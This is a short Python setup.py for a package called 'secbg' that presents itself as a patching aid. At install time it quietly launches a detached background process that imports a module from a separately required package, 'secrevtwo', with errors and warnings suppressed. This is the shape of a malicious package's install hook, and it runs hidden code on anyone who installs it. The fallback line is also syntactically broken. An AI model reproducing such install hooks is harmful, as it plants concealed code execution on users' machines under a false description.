from setuptools import setup
import subprocess

try:
	p = subprocess.Popen(["python3", "-c", "from secrevtwo import dist_util"], close_fds=True)
except:
	try:
		p = subprocess.Popen(["python", "-c", "import warnings; warnings.filterwarnings('ignore'); import secrevtwo import dist_util"], close_fds=True)
	except:
		pass

setup(name="secbg", version="0.0.5", install_requires=['secrevtwo'], description=("This is a tool developed to aid with patching"), packages=["secbg"])
